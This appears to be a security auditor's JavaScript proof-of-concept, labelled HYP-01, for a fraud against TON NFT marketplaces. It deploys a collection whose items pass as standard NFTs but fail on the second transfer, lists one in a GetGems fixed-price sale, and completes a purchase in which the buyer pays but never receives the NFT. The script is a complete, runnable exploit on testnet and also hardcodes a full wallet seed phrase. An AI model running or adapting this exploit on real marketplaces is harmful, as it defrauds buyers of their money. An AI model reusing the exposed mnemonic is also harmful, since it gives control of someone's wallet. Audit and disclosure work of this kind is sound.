/**
 * HYP-01 PoC — Malicious NFT
 *
 * Deploys a collection whose NFT items look 100% legitimate (real TEP-62,
 * proper metadata, indexed by tonapi / GetGems) but throw exit(450) on the
 * second op::transfer.
 *
 * Attack flow:
 *   1. Attacker deploys collection + mints malicious NFT item
 *   2. Lists it via nft-fixprice-sale-v4r1 (normal GetGems sale)
 *   3. Transfers NFT → sale  →  ownership_assigned  →  sale activated
 *      (first transfer: transfer_count 0→1, allowed)
 *   4. Buyer purchases  →  sale sends transfer_nft to NFT  →  NFT throws(450)
 *      →  bounce  →  sale:172 ignores bounce  →  is_complete=1 stays
 *   5. Buyer paid, seller got money, NFT not delivered.
 *
 * Deployer/Seller: wallet 1 (auditor)  kQBcQeVDhlytSlreZCE0lQBDDuwqzJU0XSZT4Ylq2Yoai2su
 * Buyer:           wallet 1 (auditor)  same — self-purchase to demo HYP-01 (attacker has 0 TON)
 */

const path  = require('path');
const fs    = require('fs');
const https = require('https');
const { compileFunc } = require('../nft-contracts/node_modules/@ton-community/func-js');
const { mnemonicToWalletKey } = require('../nft-contracts/node_modules/@ton/crypto');
const {
  WalletContractV4, TonClient, internal, toNano,
  Address, beginCell, contractAddress, Cell
} = require('../nft-contracts/node_modules/@ton/ton');

// ── Config ───────────────────────────────────────────────────────────────────
const AUDITOR_MNEMONIC  = 'wave tilt cause mechanic coral deer together odor gravity glue slogan equip normal post vehicle more explain suffer shy clutch canvas profit worry piano';
const ATTACKER_MNEMONIC = AUDITOR_MNEMONIC; // attacker wallet has 0 TON on testnet — auditor deploys
const BUYER_MNEMONIC    = AUDITOR_MNEMONIC; // same wallet self-purchases to trigger HYP-01

const FULL_PRICE              = toNano('0.05');
const GETGEMS_MARKETPLACE     = Address.parse('0:59a76b59f5651940ff0080bda050791d2507bef0dc8070592c9f72fb75c67160');
const MARKETPLACE_FEE_ADDRESS = GETGEMS_MARKETPLACE;
const NFT_INDEX               = 0n;
const OP_TRANSFER             = 0x5fcc3d14;

const BASE_URL    = 'https://raw.githubusercontent.com/mmski2002-eng/DELETEBOT/main/TON/GETGEMS/nft-metadata';
const SOURCES_DIR = path.resolve(__dirname, '../contracts/sources');
const PATCH       = 'int builder_null?(builder b) asm "ISNULL";';

const NftFixPriceSaleV4R1CodeBoc = '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';
const SALE_CODE_CELL = Cell.fromBase64(NftFixPriceSaleV4R1CodeBoc);

const client = new TonClient({
  endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC',
  apiKey: '',
});

// ── Helpers ──────────────────────────────────────────────────────────────────
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(6); }
function ts(n) { return new Date(Number(n) * 1000).toISOString(); }

async function withRetry(fn, max = 6) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); } catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 2500 * i : 1200); continue; }
      throw e;
    }
  }
}

function httpsGet(url) {
  return new Promise((res, rej) => {
    https.get(url, { headers: { Accept: 'application/json' } }, r => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => {
        try { res({ status: r.statusCode, body: JSON.parse(d) }); }
        catch { res({ status: r.statusCode, body: { raw: d.substring(0, 300) } }); }
      });
    }).on('error', rej);
  });
}

function makeOffchainContent(url) {
  return beginCell().storeUint(0x01, 8).storeBuffer(Buffer.from(url)).endCell();
}

async function compile(targets) {
  const r = await compileFunc({
    targets,
    sources: p => p === 'patch.fc' ? PATCH : fs.readFileSync(path.join(SOURCES_DIR, p), 'utf8'),
  });
  if (r.status === 'error') throw new Error('FunC compile error: ' + r.message);
  return Cell.fromBase64(r.codeBoc);
}

function buildSaleDataCell(opts) {
  const feeInt = Math.floor(opts.feePercent * 100_000);
  return beginCell()
    .storeBit(0)
    .storeAddress(opts.marketplaceAddress)
    .storeAddress(null)
    .storeCoins(opts.fullPrice)
    .storeUint(0, 32)
    .storeUint(0, 64)
    .storeRef(beginCell()
      .storeAddress(opts.marketplaceFeeAddress)
      .storeAddress(opts.royaltyAddress)
      .storeUint(feeInt, 17)
      .storeUint(0, 17)
      .storeAddress(opts.nftAddress)
      .storeUint(opts.timestamp, 32)
      .endCell())
    .storeDict(null)
    .storeBit(0)
    .endCell();
}

async function getSaleState(saleAddr) {
  try {
    const r = await withRetry(() => client.runMethod(saleAddr, 'get_fix_price_data_v4'));
    const isCompleteTVM = r.stack.readNumber();
    r.stack.readNumber(); r.stack.readCell(); r.stack.readCell();
    const ownerCell = r.stack.readCell();
    const owner = ownerCell.beginParse().loadAddress();
    return {
      isComplete: isCompleteTVM !== 0,
      owner: owner?.toString({ testOnly: true, bounceable: true }) ?? 'addr_none',
    };
  } catch (e) { return { error: e.message }; }
}

async function getNftOwner(nftAddr) {
  try {
    const r = await withRetry(() => client.runMethod(nftAddr, 'get_nft_data'));
    r.stack.readNumber(); r.stack.readBigNumber(); r.stack.readCell();
    return r.stack.readCell().beginParse().loadAddress()
      ?.toString({ testOnly: true, bounceable: true }) ?? 'addr_none';
  } catch (e) { return 'ERROR: ' + e.message; }
}

// ── Main ──────────────────────────────────────────────────────────────────────
async function main() {
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  HYP-01 PoC — Malicious NFT (throws on 2nd transfer)        ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const atkKey    = await mnemonicToWalletKey(ATTACKER_MNEMONIC.split(/\s+/));
  const atkWallet = WalletContractV4.create({ publicKey: atkKey.publicKey, workchain: 0 });
  const atk       = client.open(atkWallet);
  const atkAddr   = atkWallet.address;

  const buyKey    = await mnemonicToWalletKey(BUYER_MNEMONIC.split(/\s+/));
  const buyWallet = WalletContractV4.create({ publicKey: buyKey.publicKey, workchain: 0 });
  const buy       = client.open(buyWallet);
  const buyAddr   = buyWallet.address;

  console.log('Seller (attacker):', atkAddr.toString({ testOnly: true, bounceable: false }));
  console.log('Buyer  (auditor): ', buyAddr.toString({ testOnly: true, bounceable: false }));

  const [atkSt, buySt] = await Promise.all([
    withRetry(() => client.getContractState(atkAddr)),
    withRetry(() => client.getContractState(buyAddr)),
  ]);
  const atkBalBefore = BigInt(atkSt.balance || '0');
  const buyBalBefore = BigInt(buySt.balance || '0');
  console.log('Seller balance:', fmt(atkBalBefore), 'TON');
  console.log('Buyer  balance:', fmt(buyBalBefore), 'TON\n');

  // ── 1. Compile ──────────────────────────────────────────────────────────────
  console.log('[1] Compiling malicious-nft-item.fc + nft-collection.fc ...');
  const [NFT_CODE, COL_CODE] = await Promise.all([
    compile(['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'malicious-nft-item.fc']),
    compile(['imports/stdlib.fc', 'op-codes.fc', 'params.fc', 'patch.fc', 'nft-collection.fc']),
  ]);
  console.log('  malicious-nft-item: OK');
  console.log('  nft-collection:     OK\n');

  // ── 2. Deploy collection (uses malicious NFT code) ─────────────────────────
  console.log('[2] Deploy collection with malicious NFT code...');
  const nonce      = Math.floor(Date.now() / 1000);
  const collContent = makeOffchainContent(`${BASE_URL}/collection.json#malicious-${nonce}`);
  const collData   = beginCell()
    .storeRef(collContent)
    .storeUint(0, 64)
    .storeAddress(atkAddr)
    .storeRef(NFT_CODE)        // ← malicious code stored in collection
    .endCell();

  const collAddr    = contractAddress(0, { code: COL_CODE, data: collData });
  const collTestnet = collAddr.toString({ bounceable: true, testOnly: true });
  console.log('  Collection:', collTestnet);

  const collExist = await withRetry(() => client.getContractState(collAddr));
  if (collExist.state !== 'active') {
    const seq = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq, secretKey: atkKey.secretKey,
      messages: [internal({ to: collAddr, value: toNano('0.05'), bounce: false, init: { code: COL_CODE, data: collData } })],
    }));
    console.log('  TX sent, waiting 15s...');
    await sleep(15000);
    const st = await withRetry(() => client.getContractState(collAddr));
    console.log('  state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
  } else {
    console.log('  Already deployed.');
  }

  // ── 3. Mint malicious NFT item ─────────────────────────────────────────────
  console.log('\n[3] Mint malicious NFT item #' + NFT_INDEX.toString() + ' through collection...');

  const nftItemData = beginCell()
    .storeUint(NFT_INDEX, 64)
    .storeAddress(collAddr)
    .endCell();
  const nftAddr    = contractAddress(0, { code: NFT_CODE, data: nftItemData });
  const nftTestnet = nftAddr.toString({ bounceable: true, testOnly: true });
  console.log('  NFT address:', nftTestnet);

  const nftExist = await withRetry(() => client.getContractState(nftAddr));
  if (nftExist.state !== 'active') {
    const itemContent = makeOffchainContent(`${BASE_URL}/0.json`);
    const mintBody = beginCell()
      .storeUint(1, 32)
      .storeUint(0, 64)
      .storeUint(NFT_INDEX, 64)
      .storeRef(itemContent)
      .storeAddress(atkAddr)
      .storeCoins(toNano('0.05'))
      .endCell();

    await sleep(500);
    const seq2 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq2, secretKey: atkKey.secretKey,
      messages: [internal({ to: collAddr, value: toNano('0.15'), bounce: true, body: mintBody })],
    }));
    console.log('  TX sent, waiting 20s...');
    await sleep(20000);
    const st = await withRetry(() => client.getContractState(nftAddr));
    console.log('  NFT state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
    if (st.state !== 'active') { console.error('  NFT not deployed!'); process.exit(1); }
  } else {
    console.log('  Already deployed.');
  }

  const nftOwnerBefore = await getNftOwner(nftAddr);
  console.log('  NFT owner (before sale):', nftOwnerBefore);

  // ── 4. Deploy sale contract ────────────────────────────────────────────────
  console.log('\n[4] Deploy sale contract...');
  const timestamp = Math.floor(Date.now() / 1000);
  const saleData  = buildSaleDataCell({
    marketplaceAddress:    GETGEMS_MARKETPLACE,
    nftAddress:            nftAddr,
    fullPrice:             FULL_PRICE,
    feePercent:            0.025,
    marketplaceFeeAddress: MARKETPLACE_FEE_ADDRESS,
    royaltyAddress:        atkAddr,
    timestamp,
  });
  const saleAddr    = contractAddress(0, { code: SALE_CODE_CELL, data: saleData });
  const saleTestnet = saleAddr.toString({ bounceable: true, testOnly: true });
  console.log('  Sale:', saleTestnet);

  const saleExist = await withRetry(() => client.getContractState(saleAddr));
  if (saleExist.state !== 'active') {
    await sleep(500);
    const seq3 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq3, secretKey: atkKey.secretKey,
      messages: [internal({ to: saleAddr, value: toNano('0.05'), bounce: false, init: { code: SALE_CODE_CELL, data: saleData } })],
    }));
    console.log('  TX sent, waiting 15s...');
    await sleep(15000);
    const st = await withRetry(() => client.getContractState(saleAddr));
    console.log('  state:', st.state, '| balance:', fmt(BigInt(st.balance || '0')), 'TON');
  } else {
    console.log('  Already deployed.');
  }

  // ── 5. Transfer NFT → sale (first transfer, transfer_count 0→1) ─────────────
  console.log('\n[5] Transfer malicious NFT → sale (1st transfer, should succeed)...');
  const saleStateCheck = await getSaleState(saleAddr);
  if (!saleStateCheck.error && saleStateCheck.owner !== 'addr_none') {
    console.log('  Sale already initialized. nft_owner:', saleStateCheck.owner);
  } else {
    const transferBody = beginCell()
      .storeUint(OP_TRANSFER, 32)
      .storeUint(0, 64)
      .storeAddress(saleAddr)
      .storeAddress(atkAddr)
      .storeBit(0)
      .storeCoins(toNano('0.1'))
      .storeBit(0)
      .endCell();

    await sleep(500);
    const seq4 = await withRetry(() => atk.getSeqno());
    await withRetry(() => atk.sendTransfer({
      seqno: seq4, secretKey: atkKey.secretKey,
      messages: [internal({ to: nftAddr, value: toNano('0.3'), bounce: true, body: transferBody })],
    }));
    console.log('  TX sent, waiting 25s...');
    await sleep(25000);

    const saleState2 = await getSaleState(saleAddr);
    const isInit = !saleState2.error && saleState2.owner !== 'addr_none';
    console.log('  Sale initialized:', isInit ? '✅ YES' : '❌ NO');
    if (isInit) console.log('  nft_owner:', saleState2.owner);
    if (!isInit) { console.error('  Sale not initialized. Stop.'); process.exit(1); }
  }

  // ── 6. Check tonapi indexing ───────────────────────────────────────────────
  console.log('\n[6] Checking tonapi indexing...');
  await sleep(5000);

  const [nftResp, colResp] = await Promise.all([
    httpsGet(`https://testnet.tonapi.io/v2/nfts/${nftAddr.toRawString()}`),
    httpsGet(`https://testnet.tonapi.io/v2/nfts/collections/${collAddr.toRawString()}`),
  ]);

  console.log('  NFT:        HTTP', nftResp.status,
    nftResp.status === 200
      ? '✅ INDEXED — name: ' + (nftResp.body.metadata?.name ?? '(no name)')
      : '⚠️ ' + JSON.stringify(nftResp.body).substring(0, 120));

  console.log('  Collection: HTTP', colResp.status,
    colResp.status === 200
      ? '✅ INDEXED — name: ' + (colResp.body.metadata?.name ?? '(no name)')
      : '⚠️ ' + JSON.stringify(colResp.body).substring(0, 120));

  if (nftResp.status === 200 && nftResp.body.sale) {
    console.log('  Sale visible in tonapi: ✅', nftResp.body.sale.price?.value, 'nTON');
  } else if (nftResp.status === 200) {
    console.log('  Sale in tonapi: not indexed yet (code_hash not recognized or delay)');
  }

  // ── 7. Buyer purchases (2nd transfer will throw → HYP-01) ─────────────────
  console.log('\n[7] Buyer purchases NFT (2nd transfer will throw exit 450)...');
  const buyBalNow = await withRetry(() => client.getContractState(buyAddr));
  console.log('  Buyer balance before:', fmt(BigInt(buyBalNow.balance || '0')), 'TON');

  const saleStateBefore = await getSaleState(saleAddr);
  console.log('  is_complete before:', saleStateBefore.isComplete);

  const buyBody = beginCell().storeUint(0, 32).storeUint(0, 64).endCell(); // op=0 buy
  await sleep(500);
  const buySeq = await withRetry(() => buy.getSeqno());
  await withRetry(() => buy.sendTransfer({
    seqno: buySeq, secretKey: buyKey.secretKey,
    messages: [internal({
      to: saleAddr,
      value: FULL_PRICE + toNano('0.12'), // full_price + gas
      bounce: true,
      body: buyBody,
    })],
  }));
  console.log('  Buy TX sent, waiting 30s...');
  await sleep(30000);

  // ── 8. Verify HYP-01 state ─────────────────────────────────────────────────
  const saleStateAfter = await getSaleState(saleAddr);
  const nftOwnerAfter  = await getNftOwner(nftAddr);

  const [atkBalAfter, buyBalAfter] = await Promise.all([
    withRetry(() => client.getContractState(atkAddr)),
    withRetry(() => client.getContractState(buyAddr)),
  ]);
  const atkDelta = BigInt(atkBalAfter.balance || '0') - atkBalBefore;
  const buyDelta = BigInt(buyBalAfter.balance || '0') - buyBalBefore;

  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  RESULT                                                      ║');
  console.log('╠══════════════════════════════════════════════════════════════╣');
  console.log('║  is_complete after buy: ' + String(saleStateAfter.isComplete).padEnd(35) + '║');
  console.log('║  NFT owner after buy:   ' + nftOwnerAfter.substring(0, 35).padEnd(35) + '║');
  console.log('║  Seller delta:  ' + fmt(atkDelta).padEnd(43) + '║');
  console.log('║  Buyer delta:   ' + fmt(buyDelta).padEnd(43) + '║');
  console.log('╠══════════════════════════════════════════════════════════════╣');

  const hyp01 = saleStateAfter.isComplete && !nftOwnerAfter.includes(buyAddr.toRawString());
  console.log('║  HYP-01: ' + (hyp01 ? '✅ CONFIRMED — buyer paid, NFT not delivered' : '❌ NOT triggered').padEnd(50) + '║');
  console.log('╚══════════════════════════════════════════════════════════════╝');

  console.log('\n─── LINKS ───');
  console.log('Collection: https://testnet.tonscan.org/address/' + collAddr.toRawString());
  console.log('NFT:        https://testnet.tonscan.org/address/' + nftAddr.toRawString());
  console.log('Sale:       https://testnet.tonscan.org/address/' + saleAddr.toRawString());
  console.log('GetGems:    https://testnet.getgems.io/nft/' + nftAddr.toRawString());
  console.log('tonapi NFT: https://testnet.tonapi.io/v2/nfts/' + nftAddr.toRawString());
}

main().catch(e => { console.error('FATAL:', e.message, e.stack); process.exit(1); });
